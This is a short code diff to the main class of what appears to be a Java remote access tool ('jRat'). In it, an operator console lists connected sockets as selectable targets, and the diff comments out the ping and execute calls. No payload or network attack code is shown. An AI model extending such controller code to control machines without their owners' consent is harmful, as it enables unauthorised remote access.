@@ -21,7 +21,7 @@ public class MainClass {
 
     private static void connect(Server server) {
         System.out.println("\nSelect a target: [0..n]");
-        ping(server);
+        //ping(server);
         try {
             int selected = Integer.parseInt(new BufferedReader(new InputStreamReader(System.in)).readLine());
             Iterator <Socket> iterator = server.getMap().keySet().iterator();
@@ -36,13 +36,14 @@ public class MainClass {
                 }
             Streams selectedStreams = server.getMap().get(selectedSocket);
             Connections connected = new Connections(selectedStreams);
-            connected.execute();
+            //connected.execute();
         } catch (NumberFormatException | IOException ignored) {
 
         }
     }
 
 
+    /*
     public static void ping(Server server){
         ConcurrentHashMap<Socket, Streams> map = server.getMap();
         int i = 0;
@@ -68,6 +69,8 @@ public class MainClass {
         }
     }
 
+     */
+
 
     static public jRatGUI gui;
     public static void main(String[] args) {
@@ -76,7 +79,6 @@ public class MainClass {
             Server server = new Server(3055);
             SwingUtilities.invokeLater(() -> gui = new jRatGUI(server));
             server.startServer();
-
 
             BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
             String sel;
@@ -97,7 +99,7 @@ public class MainClass {
                         System.err.flush();
                         break;
                     }
-                        ping(server);
+                        //ping(server);
                         break;
                     case "c":	if (!server.isRunning()) {
                         System.err.println("Server in idle state");
